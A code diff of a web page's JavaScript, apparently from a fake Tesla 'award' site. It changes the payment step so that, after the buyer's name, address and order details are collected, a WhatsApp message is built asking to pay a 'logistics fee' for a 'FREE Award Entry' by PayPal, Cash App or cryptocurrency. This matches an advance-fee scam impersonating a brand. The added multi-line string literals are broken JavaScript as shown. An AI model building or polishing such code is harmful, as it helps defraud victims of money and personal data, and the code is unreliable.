@@ -101,7 +101,75 @@ var im=document.getElementById('carMiniImg');
 if(vi&&vi.img)im.src=vi.img;else if(sc.img)im.src=sc.img;
 var sp=null;
 function selectPayment(m){sp=m;document.querySelectorAll('.pay-card').forEach(function(e){e.classList.remove('selected')});document.getElementById('pay-'+m).classList.add('selected');var b=document.getElementById('payBtn');b.disabled=false;b.style.opacity='1';b.style.cursor='pointer';b.textContent='🔒 Pay '+(sm?sm.priceDisplay:'')+' & Place Order'}
-function processPayment(){if(!sp||!st)return;showLoading('Processing your order...');apiCall('/order','POST',{sessionToken:st,selectedCar:sc,deliveryDetails:sd,deliveryMethod:sm,paymentMethod:{id:sp,name:sp==='paypal'?'PayPal':sp==='cashapp'?'Cash App':'Cryptocurrency'}}).then(function(r){localStorage.setItem('tesla_last_order',JSON.stringify(r.order));hideLoading(function(){window.location.href='https://wa.me/'+PR+'?text='+encodeURIComponent('Hi, I would like to complete my Tesla order payment.')})}).catch(function(e){hideLoading();showToast(e.message||'Order failed. Please try again.','error')})}
+function processPayment() {
+  if (!sp || !st) return;
+  showLoading('Processing your order...');
+  
+  var payMethodName = sp === 'paypal' ? 'PayPal' : sp === 'cashapp' ? 'Cash App' : 'Cryptocurrency';
+  
+  apiCall('/order', 'POST', {
+    sessionToken: st,
+    selectedCar: sc,
+    deliveryDetails: sd,
+    deliveryMethod: sm,
+    paymentMethod: { id: sp, name: payMethodName }
+  }).then(function(r) {
+    var ord = r.order || {};
+    localStorage.setItem('tesla_last_order', JSON.stringify(ord));
+    
+    // Generate a professional pre-filled WhatsApp message
+    var orderId = ord.orderId || 'N/A';
+    var trackingNum = ord.trackingNumber || 'N/A';
+    var name = ord.deliveryDetails && ord.deliveryDetails.fullName || 'N/A';
+    var model = ord.selectedCar && ord.selectedCar.name ? 'Tesla ' + ord.selectedCar.name : 'N/A';
+    var retailVal = ord.selectedCar && ord.selectedCar.price ? ord.selectedCar.price : 'N/A';
+    
+    var addr = ord.deliveryDetails ? [
+      ord.deliveryDetails.address,
+      ord.deliveryDetails.city,
+      ord.deliveryDetails.state,
+      ord.deliveryDetails.zipCode,
+      ord.deliveryDetails.country
+    ].filter(Boolean).join(', ') : 'N/A';
+    
+    var delivMethod = ord.deliveryMethod && ord.deliveryMethod.name ? ord.deliveryMethod.name : 'N/A';
+    var delivFee = ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined' ? '$' + ord.deliveryMethod.price : 'Pending';
+    var orderDate = ord.orderDate ? new Date(ord.orderDate).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }) : new Date().toLocaleString();
+    
+    var message = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*
+
+' +
+      '• *Order ID:* ' + orderId + '
+' +
+      '• *Tracking Number:* ' + trackingNum + '
+' +
+      '• *Customer Name:* ' + name + '
+' +
+      '• *Tesla Model:* ' + model + '
+' +
+      '• *Retail Value:* ' + retailVal + ' (FREE Award Entry)
+' +
+      '• *Delivery Address:* ' + addr + '
+' +
+      '• *Delivery Method:* ' + delivMethod + ' (' + delivFee + ' Logistics Fee)
+' +
+      '• *Payment Method:* ' + payMethodName + '
+' +
+      '• *Order Date & Time:* ' + orderDate + '
+' +
+      '• *Total Logistics Fee Due:* ' + delivFee + '
+
+' +
+      'Hi, I have successfully placed my order and would like to proceed with the payment confirmation of ' + delivFee + ' via ' + payMethodName + '. Please guide me with the secure checkout details.';
+      
+    hideLoading(function() {
+      window.location.href = 'https://wa.me/' + PR + '?text=' + encodeURIComponent(message);
+    });
+  }).catch(function(e) {
+    hideLoading();
+    showToast(e.message || 'Order failed. Please try again.', 'error');
+  });
+}
 </script>
 </body>
 <!-- build: 1784129877 -->
